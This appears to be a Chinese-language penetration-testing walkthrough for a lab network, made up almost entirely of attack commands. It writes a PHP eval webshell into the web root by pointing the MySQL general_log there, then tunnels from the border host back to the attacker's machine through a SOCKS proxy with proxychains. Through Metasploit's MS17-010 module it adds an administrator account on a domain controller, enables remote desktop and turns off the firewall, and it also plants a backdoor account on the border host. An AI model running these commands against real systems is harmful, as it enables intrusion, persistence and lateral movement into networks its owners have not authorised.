## 1. phpMyAdmin 写马

### 1.1 检查数据库文件权限

```sql
select group_concat(user,0x3a,file_priv) from mysql.user;
```

`file_priv` 为 `Y` 表示当前数据库用户拥有文件权限。

### 1.2 检查 secure_file_priv

```sql
show variables like '%secure_file_priv%';
```

结果为 `NULL` 时不能使用 `INTO OUTFILE` 或 `LOAD_FILE`。

### 1.3 查看 general_log 状态和路径

```sql
show variables like '%general%';
```

获取当前 `general_log` 开关状态和日志文件路径。

### 1.4 开启日志并修改日志路径

```sql
set global general_log = on;
set global general_log_file = 'C:\\phpStudy\\WWW\\shell.php';
```

把 MySQL 查询日志写入 Web 目录。

### 1.5 通过查询写入 WebShell

```sql
select "<?php eval($_POST['cmd']);?>";
```

这条查询会写入日志文件，从而落成 `shell.php`。

### 1.6 恢复日志路径并关闭日志

```sql
set global general_log_file='C:\\phpStudy\\MySQL\\data\\stu1.log';
set global general_log = off;
```

避免后续日志继续增长，并恢复原日志位置。

### 1.7 合并执行

```sql
set global general_log = on;set global general_log_file = 'C:\\phpStudy\\WWW\\shell.php';select "<?php eval($_POST['cmd']);?>";set global general_log_file='C:\\phpStudy\\MySQL\\data\\stu1.log';set global general_log = off;
```

将开启日志、改路径、写马、恢复和关闭放在一条语句中执行。

## 3. 边界主机信息收集

```cmd
tasklist
ipconfig /all
```

`tasklist` 查看进程和杀软，`ipconfig /all` 查看网卡、内网和域信息。

## 5. 隧道

### 5.1 攻击机启动服务端

```text
admin.exe -l 2222 -s websec
```

监听 `2222` 端口，使用 `websec` 作为代理认证密钥。

### 5.2 边界主机启动客户端

```text
agent.exe -c 192.168.2.127:2222 -s websec --reconnect 10
```

连接攻击机并保持断线重连。

### 5.3 创建 SOCKS 代理

```text
use 0
socks 7777
```

选择代理节点并监听本地 `7777` 端口。

### 5.4 配置 proxychains

```bash
nano /etc/proxychains4.conf
```

添加：

```text
socks5 192.168.2.127 7777
```

让命令行工具通过该 SOCKS 代理访问内网。

## 6. MS17-010 命令执行

```text
proxychains msfconsole
use auxiliary/admin/smb/ms17_010_command
set rhost 192.168.52.138
set command net user websec admin@123 /add
run
```

通过 MS17-010 模块在域控上创建用户。

```text
set command net user websec admin@123 /add
run
set command net localgroup Administrators websec /add
run
```

创建 `websec` 用户并加入本地管理员组。

```text
set COMMAND 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
run
```

开启远程桌面。

```text
set command netsh firewall set opmode disable
run
```

关闭目标防火墙。

## 7. 边界主机本地后门

```cmd
net user websec admin@123 /add
net localgroup Administrators websec /add
```

创建本地用户并加入管理员组。
